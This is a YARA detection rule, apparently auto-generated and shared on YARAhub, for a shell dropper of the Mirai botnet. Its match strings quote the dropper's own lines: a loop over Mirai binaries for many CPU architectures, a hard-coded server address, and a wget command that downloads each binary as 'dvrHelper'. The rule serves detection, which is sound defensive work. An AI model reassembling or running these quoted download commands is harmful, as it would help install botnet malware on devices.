rule SCRIPT_Dropper_Unknown_ForgeAuto_f09ef30b
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-02"
        reference_sha256 = "f09ef30b9e137680020b23b45ef8f5647756972dab81d41338fe7706977dbe1f"
        yarahub_uuid = "b28ae0e0-0700-45c2-8e80-7e40ff915ea7"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "0a5326c391aaf0d3787f2a691e4c06b4"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "for Binary in $BINARIES; do" ascii
        $s1 = "WEBSERVER=\"151.240.151.7:80\"" ascii
        $s2 = "BINARIES=\"mirai.arm4n mirai.arm5n mirai.arm6n mirai.i586 mirai.i686 mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.spc mirai.x86\"" ascii
        $s3 = "wget http://$WEBSERVER/$Binary -O dvrHelper" ascii
        $s4 = "mirai.arm4n mirai.arm5n mirai.arm6n mirai.i586 mirai.i686 mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.spc mirai.x86" ascii
        $s5 = "151.240.151.7:80" ascii
    condition:
        true and filesize < 50MB and 2 of ($s0, $s2, $s3, $s4) and 1 of ($s1, $s5)
}
